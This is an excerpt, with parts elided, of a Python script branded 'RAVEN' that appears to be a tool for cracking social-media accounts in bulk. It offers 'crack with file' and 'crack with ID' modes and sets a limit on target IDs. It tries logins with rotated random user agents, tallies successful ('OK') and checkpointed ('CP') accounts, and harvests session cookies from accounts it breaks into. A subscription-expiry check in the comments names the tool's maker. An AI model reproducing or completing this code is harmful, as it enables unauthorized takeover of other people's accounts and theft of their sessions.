...
# g= datetime.datetime(2023, 12, 30, 7, 10 ,9)
...
# if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   # if(x.strftime("%X"))>(g.strftime("%X")):
    # print('\n\n')
    # print("     "+'خلص اشتراك عليك مراجعة صانع اداة  @ZIllZlll0 ☄️🗿')
    # print('\n\n')
    # print(x)
...
def menu():
	...
	print("[ G1 ] تــࢪك")
	print("[ 2 ] CRACK WITH FILE")
	print("[ 3 ] CRACK WITH ID")
	print('[ 0 ] LOG OUT')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('''   \033[2;32m[+]  \x1b[38;5;209mCRACK ID LIMIT : \033[2;35m'''))
		print()
	except ValueError:
	...
	try:
		print('')
		print(f''''  \033[2;32m[+]  \x1b[38;5;209mALL ID : \033[2;35m'''+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ RAVEN ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ RAVEN ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='RAVEN CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='RAVEN OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]RAVEN OK[/bold green]'))
					ok+=1
					break
